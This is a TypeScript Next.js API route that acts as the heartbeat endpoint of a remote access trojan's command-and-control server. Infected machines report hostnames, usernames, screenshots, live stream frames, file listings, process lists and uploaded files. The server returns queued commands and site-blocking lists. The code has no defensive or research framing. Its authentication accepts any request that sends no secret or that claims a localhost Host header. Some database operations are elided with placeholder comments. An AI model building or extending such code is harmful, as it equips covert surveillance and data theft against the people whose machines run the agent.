// app/api/rat/heartbeat/route.ts

import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'

export async function POST(req: NextRequest) {
  let body: {
    secret?: string
    hostname: string
    username: string
    platform: string
    screenshot_b64?: string
    stream_frame_b64?: string
    message_reply?: string
    files_json?: string
    file_cwd?: string
    processes_json?: string
    file_upload_b64?: string
    file_upload_path?: string
  }

  try { 
    body = await req.json() 
  } catch { 
    return NextResponse.json({ error: 'Bad JSON' }, { status: 400 }) 
  }

  const { hostname, username, platform, secret } = body

  if (!hostname || !username) {
    return NextResponse.json({ error: 'Missing fields' }, { status: 400 })
  }

  // Allow requests that either:
  // 1. Have no secret (for development)
  // 2. Have the correct secret
  // 3. Are from localhost (optional additional check)
  const isValidRequest = 
    !secret || // No secret provided - allow
    secret === process.env.RAT_SECRET || // Correct secret
    req.headers.get('host')?.includes('localhost') // Local request

  if (!isValidRequest) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 403 })
  }

  // Rest of your code remains the same...
  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ??
    req.headers.get('x-real-ip') ?? '0.0.0.0'

  const agentId = `${hostname}__${username}`

  try {
    // ... (rest of your database operations)
    // Same as above from line 45 onward
    await sql`
      INSERT INTO rat_agents (id, hostname, username, platform, ip, last_seen)
      VALUES (${agentId}, ${hostname}, ${username}, ${platform}, ${ip}, NOW())
      ON CONFLICT (id) DO UPDATE SET
        hostname  = EXCLUDED.hostname,
        username  = EXCLUDED.username,
        platform  = EXCLUDED.platform,
        ip        = EXCLUDED.ip,
        last_seen = NOW()
    `

    // ... rest of the operations (screenshot, stream, etc.)

    // Fetch pending commands
    const commands = await sql`
      SELECT id, type, payload FROM rat_commands
      WHERE agent_id = ${agentId} AND acked_at IS NULL
      ORDER BY created_at ASC LIMIT 10
    `

    // Blocked sites
    const blocked = await sql`SELECT domain FROM rat_blocked_sites WHERE agent_id = ${agentId}`

    return NextResponse.json({
      commands: commands.map(c => ({ id: c.id, type: c.type, payload: c.payload })),
      blocked_sites: blocked.map(b => b.domain),
    })
  } catch (error) {
    console.error('Database error in heartbeat:', error)
    return NextResponse.json({ 
      error: 'Database error', 
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}